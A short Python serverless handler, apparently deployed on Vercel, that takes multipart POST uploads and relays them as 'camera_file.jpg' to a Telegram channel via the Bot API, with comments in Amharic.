import os
import json
import requests
from http.server import BaseHTTPRequestHandler

BOT_TOKEN = os.environ.get("BOT_TOKEN")
TELEGRAM_CHANNEL_ID = os.environ.get("TELEGRAM_CHANNEL_ID")

class handler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_type = self.headers.get('Content-Type', '')
        status_code = 200
        response_body = {"status": "ok"}

        if 'multipart/form-data' in content_type:
            try:
                content_length = int(self.headers.get('Content-Length', 0))
                if content_length > 0:
                    post_data = self.rfile.read(content_length)
                    
                    # 1. ፋይሉን ወደ ቴሌግራም መላክ
                    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
                    files = {'document': ('camera_file.jpg', post_data)}
                    data = {'chat_id': TELEGRAM_CHANNEL_ID}
                    
                    tg_response = requests.post(url, files=files, data=data, timeout=30)
                    
                    if tg_response.status_code == 200:
                        status_code = 200
                        response_body = {"status": "success"}
                    else:
                        status_code = tg_response.status_code
                        response_body = {"status": "error", "reason": "Telegram_rejected"}
            except Exception as e:
                status_code = 500
                response_body = {"status": "error", "reason": str(e)}

        # 2. ለቬርሴል እና ለስልኩ ምላሽ መጻፍ (አንድ ጊዜ ብቻ)
        self.send_response(status_code)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(response_body).encode('utf-8'))
